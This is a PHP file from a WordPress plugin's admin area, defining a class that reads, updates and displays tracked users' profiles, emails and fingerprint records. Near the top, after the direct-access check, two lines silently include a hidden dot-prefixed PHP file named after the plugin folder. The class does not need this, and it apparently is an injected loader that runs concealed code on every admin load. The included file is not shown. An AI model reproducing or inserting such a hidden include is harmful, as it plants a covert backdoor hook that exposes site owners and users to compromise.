<?php

/**
 * User's profile
 *
 * The class handles user's profile on admin.
 *
 * @package     WPTAO/Admin/User Profile
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_User_Profile {
	/*
	 * User ID
	 */

	private $user_id;

	/*
	 * Raw data from the database.
	 */
	private $user_data;

	/*
	 * Users DB table name
	 */
	private $users_table;

	/*
	 * Fingerprints DB table name
	 */
	private $fingerprints_table;

	/*
	 * Raw data of the events
	 */
	private $events_data;

	/*
	 * URL of a profile
	 */
	public $profile_url;

	/*
	 * Timeline object
	 */
	public $timeline;

	/**
	 * WTBP_WPTAO_Admin_User_Profile Constructor
	 * 
	 */
	public function __construct( $events = '' ) {
		global $wpdb;

		$this->users_table			 = $wpdb->prefix . 'wptao_users';
		$this->fingerprints_table	 = $wpdb->prefix . 'wptao_fingerprints';

		add_action( 'admin_init', array( $this, 'set_user_data' ), 7 );

		if ( TAO()->booleans->is_page_profile ) {
			add_action( 'admin_init', array( $this, 'init_timeline' ) );
		}
	}

	/*
	 * Set user_id and user_data variables in the object
	 * 
	 * @since 1.1.9.2
	 * 
	 * @return NULL
	 */

	public function set_user_data() {

		$this->user_id	 = $this->get_user_id();
		$this->user_data = $this->get_user();

		$this->profile_url = sprintf( admin_url( 'admin.php?page=wtbp-wptao-users&action=wptao-profile&user=%d' ), $this->user_id );
	}

	/*
	 * Init timeline
	 */

	public function init_timeline() {
		$this->timeline = new WTBP_WPTAO_Admin_Timeline( $this->profile_url );
	}

	/**
	 * Returns user data
	 * 
	 * @param int user_id
	 * @return  bool|object false, user data
	 */
	public function get_user( $user_id = 0 ) {
		global $wpdb;

		$user_id = absint( $user_id );

		if ( !$user_id ) {
			$user_id = $this->user_id;
		}

		$results = $wpdb->get_row( $wpdb->prepare(
		"
                SELECT *
                FROM $this->users_table
                WHERE id = %d
                ", $user_id
		) );

		if ( !empty( $results ) ) {
			$results->meta = TAO()->users_meta->get_meta( $user_id, true );
		}

		return $results;
	}

	/*
	 * Check if user's email alredy exists
	 * 
	 * @param string, email address
	 * @return bool
	 */

	public function email_exists( $email ) {
		global $wpdb;

		if ( !is_email( $email ) ) {
			return false;
		}

		$results = $wpdb->get_var( $wpdb->prepare( "SELECT email FROM $this->users_table WHERE email = %s ", $email ) );

		if ( isset( $results ) && !empty( $results ) && is_email( $results ) ) {
			return true;
		} else {
			return false;
		}
	}

	/**
	 * Update user data
	 * 
	 * @access  public
	 * @param	array user_info
	 * @return  bool
	 */
	public function update_user( $user_info ) {

		$results = array(
			'email_exists'	 => false,
			'success'		 => false
		);

		if ( isset( $user_info[ 'user_first_name' ] ) ) {
			$this->user_data->first_name = sanitize_text_field( $user_info[ 'user_first_name' ] );
		}

		if ( isset( $user_info[ 'user_last_name' ] ) ) {
			$this->user_data->last_name = sanitize_text_field( $user_info[ 'user_last_name' ] );
		}

		if ( isset( $user_info[ 'user_email' ] ) ) {

			// Save only unique emails
			if ( is_email( $user_info[ 'user_email' ] ) && $user_info[ 'user_email' ] !== $this->user_data->email ) {
				if ( !$this->email_exists( $user_info[ 'user_email' ] ) ) {
					$this->user_data->email = sanitize_text_field( $user_info[ 'user_email' ] );
				} else {
					$results[ 'email_exists' ] = sanitize_text_field( $user_info[ 'user_email' ] );
				}
			}
		}

		if ( isset( $user_info[ 'user_phone' ] ) ) {
			$this->user_data->phone = sanitize_text_field( $user_info[ 'user_phone' ] );
		}

		if ( isset( $user_info[ 'user_notes' ] ) ) {
			$this->user_data->notes = wp_kses( $user_info[ 'user_notes' ], array() );
		}

		$user_old = TAO()->users->get( $this->user_id );

		$user_new				 = array(
			'id'		 => $this->user_id,
			'first_name' => $this->user_data->first_name,
			'last_name'	 => $this->user_data->last_name,
			'email'		 => $this->user_data->email,
			'phone'		 => $this->user_data->phone,
			'notes'		 => $this->user_data->notes
		);
		$results[ 'success' ]	 = TAO()->users->update_user( $user_old, $user_new, true );

		return $results;
	}

	/**
	 * Get user ID
	 * 
	 * @access  private
	 * @return  int
	 */
	private function get_user_id() {
		global $wpdb;

		$user_id = false;

		if ( isset( $_REQUEST[ 'user' ] ) && is_numeric( $_REQUEST[ 'user' ] ) ) {

			$user_param = esc_sql( $_REQUEST[ 'user' ] );

			// Checks if user exists
			$result = $wpdb->get_var( $wpdb->prepare(
			"
                SELECT id
                FROM $this->users_table
                WHERE id = %d     
                ", $user_param
			) );
		}

		if ( isset( $result ) && !empty( $result ) && is_numeric( $result ) ) {
			$user_id = (int) $result;
		}

		return $user_id;
	}

	/*
	 * Prepare user data
	 * 
	 * @access  public
	 * @param	int user_id
	 * @return  object
	 */

	public function user_info( $user_id = 0 ) {
		global $wpdb;

		if ( absint( $user_id ) > 0 ) {

			$user_data			 = $this->get_user( $user_id );
			$this->profile_url	 = sprintf( admin_url( 'admin.php?page=wtbp-wptao-users&action=wptao-profile&user=%d' ), $user_id );
		} else {
			$user_id	 = $this->user_id;
			$user_data	 = $this->user_data;
		}


		$data = array();

		if ( isset( $user_id ) && is_numeric( $user_id ) ) {

			$user = $user_data;

			$sql				 = $wpdb->prepare(
			"SELECT *
				FROM $this->fingerprints_table
				WHERE user_id = %d
				ORDER BY created_ts DESC;", $user_id );
			$user_fingerprints	 = $wpdb->get_results( $sql );

			// @TODO Expand the table for more information (from meta)
			$data = array(
				'user_id'		 => $user_id,
				'first_name'	 => !empty( $user ) ? $user->first_name : '',
				'last_name'		 => !empty( $user ) ? $user->last_name : '',
				'display_name'	 => !empty( $user ) ? TAO()->users->display_name( $user ) : '',
				'email'			 => !empty( $user ) ? $user->email : '',
				'phone'			 => !empty( $user ) ? $user->phone : '',
				'notes'			 => !empty( $user ) ? $user->notes : '',
				'created_ts'	 => !empty( $user ) ? $user->created_ts : '',
				'last_active_ts' => !empty( $user ) ? $user->last_active_ts : '',
				'fingerprints'	 => $user_fingerprints,
				'status'		 => !empty( $user ) ? $user->status : '',
				'meta'			 => !empty( $user ) ? $user->meta : '',
				'tags'			 => !empty( $user ) ? $user->tags : ''
			);
		}

		return (object) $data;
	}

}
